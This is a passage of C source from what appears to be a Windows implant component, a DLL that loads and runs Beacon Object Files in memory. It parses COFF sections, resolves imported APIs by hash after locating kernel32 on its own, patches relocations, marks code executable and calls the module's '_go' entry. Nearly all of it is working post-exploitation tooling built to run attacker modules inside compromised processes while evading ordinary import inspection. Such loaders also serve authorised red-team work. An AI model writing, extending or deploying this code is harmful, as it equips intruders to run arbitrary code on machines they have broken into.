    uint32_t sym_tbl_off = le32(bof + HDR_PTR_SYMTAB_OFF);
    uint32_t n_syms      = le32(bof + HDR_NSYMBOLS_OFF);
    uint32_t string_tbl_off = sym_tbl_off + n_syms * COFF_SYMBOL_SIZE;

    /* Layout: sections back-to-back + one 4-byte import slot per
     * unique external symbol (added at the tail). The slots act
     * as the __imp__ jump table the BOF dereferences via
     * `call dword ptr [imp_slot]`. */

    /* Pass 1: total raw size + count of unique external symbols. */
    uint32_t total_raw = 0;
    for (uint16_t i = 0; i < nsec; i++) {
        const uint8_t *sh = bof + sec_tbl_off + (uint32_t)i * COFF_SECTION_SIZE;
        total_raw += le32(sh + SEC_SIZE_OF_RAW_DATA_OFF);
    }

    /* Walk relocations to enumerate unique external symbols. We
     * over-allocate one slot per relocation (each reloc references
     * at most one symbol, and unique-ifying is a separate pass).
     * Cap at 64 unique imports to keep the math sane. */
    #define MAX_UNIQUE_IMPORTS 64
    uint32_t import_sym_idx[MAX_UNIQUE_IMPORTS];
    uint32_t import_slot_off[MAX_UNIQUE_IMPORTS];
    uint32_t n_imports = 0;

    for (uint16_t i = 0; i < nsec; i++) {
        const uint8_t *sh = bof + sec_tbl_off + (uint32_t)i * COFF_SECTION_SIZE;
        uint16_t nr     = le16(sh + SEC_NUMBER_OF_RELOCS_OFF);
        uint32_t rp     = le32(sh + SEC_PTR_TO_RELOCS_OFF);
        for (uint16_t r = 0; r < nr; r++) {
            const uint8_t *re = bof + rp + (uint32_t)r * COFF_RELOC_SIZE;
            uint32_t sym_ix = le32(re + REL_SYMBOL_TBL_INDEX_OFF);
            if (sym_ix >= n_syms) {
                p->error_code = 0x10010;
                return LOADER_STATUS_LOAD_FAIL;
            }
            const uint8_t *sym = bof + sym_tbl_off + sym_ix * COFF_SYMBOL_SIZE;
            int16_t sym_sec = (int16_t)le16(sym + SYM_SECTION_NUMBER_OFF);
            if (sym_sec != 0) continue;  /* internal — handled in pass 3 */

            /* Dedup by symbol-table index (cheaper than name compare). */
            uint32_t dup = 0;
            for (uint32_t k = 0; k < n_imports; k++) {
                if (import_sym_idx[k] == sym_ix) { dup = 1; break; }
            }
            if (dup) continue;
            if (n_imports >= MAX_UNIQUE_IMPORTS) {
                p->error_code = 0x10011;
                return LOADER_STATUS_LOAD_FAIL;
            }
            import_sym_idx[n_imports] = sym_ix;
            n_imports++;
        }
    }

    uint32_t total = total_raw + n_imports * 4;
    if (total == 0 || total > 0x01000000u) {
        p->error_code = 0x10005;
        return LOADER_STATUS_LOAD_FAIL;
    }
    uint8_t *mapping = (uint8_t *)g_kapi.VirtualAlloc(
        0, total, /* MEM_COMMIT|MEM_RESERVE */ 0x3000,
        /* PAGE_READWRITE */ 0x04);
    if (!mapping) {
        p->error_code = 0x10006;
        return LOADER_STATUS_LOAD_FAIL;
    }

    /* Pass 2: copy sections, record per-section base + exec flag. */
    uint32_t section_base[MAX_SECTIONS + 1] = {0};
    uint8_t  section_exec[MAX_SECTIONS + 1] = {0};
    uint32_t cursor = 0;
    for (uint16_t i = 0; i < nsec; i++) {
        const uint8_t *sh = bof + sec_tbl_off + (uint32_t)i * COFF_SECTION_SIZE;
        uint32_t raw_size = le32(sh + SEC_SIZE_OF_RAW_DATA_OFF);
        uint32_t raw_ptr  = le32(sh + SEC_PTR_TO_RAW_DATA_OFF);
        uint32_t chars    = le32(sh + SEC_CHARACTERISTICS_OFF);
        if (raw_size == 0 || raw_ptr == 0) continue;
        if (raw_ptr + raw_size > bof_len) {
            p->error_code = 0x10007;
            return LOADER_STATUS_LOAD_FAIL;
        }
        loader_memcpy(mapping + cursor, bof + raw_ptr, raw_size);
        section_base[i + 1] = (uint32_t)(mapping + cursor);
        section_exec[i + 1] = (chars & IMAGE_SCN_MEM_EXECUTE) ? 1 : 0;
        cursor += raw_size;
    }

    /* Pass 3a: resolve external imports + populate slots. */
    uint32_t imports_base = (uint32_t)(mapping + total_raw);
    for (uint32_t k = 0; k < n_imports; k++) {
        const uint8_t *sym  = bof + sym_tbl_off + import_sym_idx[k] * COFF_SYMBOL_SIZE;
        const uint8_t *name = sym_name_at(sym, bof, string_tbl_off);
        uint32_t hash = hash_extern_sym(name);
        uint32_t addr = beacon_resolve(hash);
        if (!addr) {
            p->error_code = 0x10012;
            return LOADER_STATUS_LOAD_FAIL;
        }
        uint32_t slot_addr = imports_base + k * 4;
        *(uint32_t *)slot_addr = addr;
        import_slot_off[k] = slot_addr;
    }

    /* Pass 3b: apply relocations. */
    for (uint16_t i = 0; i < nsec; i++) {
        const uint8_t *sh = bof + sec_tbl_off + (uint32_t)i * COFF_SECTION_SIZE;
        uint16_t nr     = le16(sh + SEC_NUMBER_OF_RELOCS_OFF);
        if (nr == 0) continue;
        uint32_t rp     = le32(sh + SEC_PTR_TO_RELOCS_OFF);
        uint32_t sec_base = section_base[i + 1];
        if (sec_base == 0) continue;

        for (uint16_t r = 0; r < nr; r++) {
            const uint8_t *re = bof + rp + (uint32_t)r * COFF_RELOC_SIZE;
            uint32_t va     = le32(re + REL_VIRTUAL_ADDR_OFF);
            uint32_t sym_ix = le32(re + REL_SYMBOL_TBL_INDEX_OFF);
            uint16_t type   = le16(re + REL_TYPE_OFF);
            const uint8_t *sym = bof + sym_tbl_off + sym_ix * COFF_SYMBOL_SIZE;
            int16_t sym_sec = (int16_t)le16(sym + SYM_SECTION_NUMBER_OFF);

            uint32_t target;
            if (sym_sec > 0) {
                if ((uint32_t)sym_sec > nsec || section_base[sym_sec] == 0) {
                    p->error_code = 0x10013;
                    return LOADER_STATUS_LOAD_FAIL;
                }
                target = section_base[sym_sec] + le32(sym + SYM_VALUE_OFF);
            } else if (sym_sec == 0) {
                /* External — find slot. */
                uint32_t slot = 0;
                for (uint32_t k = 0; k < n_imports; k++) {
                    if (import_sym_idx[k] == sym_ix) { slot = import_slot_off[k]; break; }
                }
                if (!slot) {
                    p->error_code = 0x10014;
                    return LOADER_STATUS_LOAD_FAIL;
                }
                target = slot;
            } else {
                target = le32(sym + SYM_VALUE_OFF);
            }

            uint8_t *patch = (uint8_t *)(sec_base + va);
            if (type == IMAGE_REL_I386_ABSOLUTE) {
                /* no-op */
            } else if (type == IMAGE_REL_I386_DIR32) {
                le32_put(patch, target + le32(patch));
            } else if (type == IMAGE_REL_I386_REL32) {
                uint32_t pc = (uint32_t)patch + 4;
                le32_put(patch, target + le32(patch) - pc);
            } else if (type == IMAGE_REL_I386_DIR32NB) {
                le32_put(patch, target + le32(patch) - (uint32_t)mapping);
            } else {
                p->error_code = 0x10015 | ((uint32_t)type << 16);
                return LOADER_STATUS_LOAD_FAIL;
            }
        }
    }

    /* Pass 4: flip exec sections to PAGE_EXECUTE_READ. */
    for (uint16_t i = 0; i < nsec; i++) {
        if (!section_exec[i + 1] || !section_base[i + 1]) continue;
        const uint8_t *sh = bof + sec_tbl_off + (uint32_t)i * COFF_SECTION_SIZE;
        uint32_t raw_size = le32(sh + SEC_SIZE_OF_RAW_DATA_OFF);
        uint32_t old_protect = 0;
        if (!g_kapi.VirtualProtect((void *)section_base[i + 1], raw_size,
                                    /* PAGE_EXECUTE_READ */ 0x20, &old_protect)) {
            p->error_code = 0x10016;
            return LOADER_STATUS_LOAD_FAIL;
        }
    }

    /* Pass 5: find _go and call it cdecl. */
    uint32_t entry_addr = 0;
    for (uint32_t i = 0; i < n_syms; i++) {
        const uint8_t *sym = bof + sym_tbl_off + i * COFF_SYMBOL_SIZE;
        int16_t sym_sec = (int16_t)le16(sym + SYM_SECTION_NUMBER_OFF);
        if (sym_sec <= 0) {
            i += sym[SYM_NUMBER_OF_AUX_OFF];
            continue;
        }
        if (!name_eq_underscore_go(sym, bof, string_tbl_off)) {
            i += sym[SYM_NUMBER_OF_AUX_OFF];
            continue;
        }
        if ((uint32_t)sym_sec > nsec || section_base[sym_sec] == 0) {
            p->error_code = 0x10020;
            return LOADER_STATUS_LOAD_FAIL;
        }
        entry_addr = section_base[sym_sec] + le32(sym + SYM_VALUE_OFF);
        break;
    }
    if (entry_addr == 0) {
        p->error_code = 0x10021;
        return LOADER_STATUS_LOAD_FAIL;
    }

    typedef void __cdecl (*bof_entry_t)(const void *args, int32_t alen);
    ((bof_entry_t)entry_addr)((const void *)p->args_addr, (int32_t)p->args_len);

    return LOADER_STATUS_DONE;
}

/* — Entry --------------------------------------------------------- */

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    (void)hinst; (void)reason; (void)reserved;
    return TRUE;
}

__declspec(dllexport) uint32_t __stdcall BOFExec(loader_params_t *p)
{
    if (!p) return LOADER_STATUS_ABI_MISMATCH;

    if (p->magic != LOADER_ABI_MAGIC || p->version != LOADER_ABI_VERSION) {
        p->status = LOADER_STATUS_ABI_MISMATCH;
        p->error_code = p->magic ^ LOADER_ABI_MAGIC;
        return LOADER_STATUS_ABI_MISMATCH;
    }
    p->status = LOADER_STATUS_RUNNING;

    uint32_t k32 = find_kernel32_base();
    if (!k32) {
        p->status = LOADER_STATUS_RESOLVE_FAIL;
        return LOADER_STATUS_RESOLVE_FAIL;
    }
    if (!resolve_kapi(k32, &g_kapi)) {
        p->status = LOADER_STATUS_RESOLVE_FAIL;
        return LOADER_STATUS_RESOLVE_FAIL;
    }
    g_params = p;

    uint32_t result = exec_bof(p);
    p->status = result;
    g_kapi.ExitThread(result);
    return result;  /* unreachable */
}
